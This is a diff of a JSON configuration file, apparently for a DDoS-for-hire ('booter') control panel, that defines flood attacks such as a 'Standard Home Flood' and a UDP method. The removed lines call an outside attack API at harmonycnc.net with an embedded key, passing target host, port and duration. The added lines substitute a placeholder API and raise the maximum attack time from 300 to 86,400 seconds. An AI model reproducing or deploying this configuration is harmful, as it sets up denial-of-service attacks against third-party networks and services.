@@ -2,35 +2,17 @@
      "Attacks" : [
 
           {
-               "Name" : "home-harmony",
-               "AttackName" : "HARMONY-HOME",
+               "Name" : "homeholder",
+               "AttackName" : "udp",
                "Description" : "Standard Home Flood",
-               "API" : "https://harmonycnc.net/api?key=HarmonyCNC2392&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+               "API" : "INSERTAPIHERE=<<$target>>&port=<<$port>>&time=<<$time>>&method=udp",
 
                "moderation" : {
                     "LimitMaxTime" : true,
-                    "MaxTime" : 300
+                    "MaxTime" : 86400
                },
 
                "DefaultPort" : "80",
-
-
-               "AdminMethod" : false,
-               "VipMethod" : false
-          },
-          {
-               "Name" : "ovh-harmony",
-               "AttackName" : "HARMONY-OVH",
-               "Description" : "Standard Home Flood",
-               "API" : "https://harmonycnc.net/api?key=HarmonyCNC2392&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
-               
-               "moderation" : {
-                    "LimitMaxTime" : true,
-                    "MaxTime" : 300
-               },
-
-
-               "DefaultPort" : "22",
 
 
                "AdminMethod" : false,
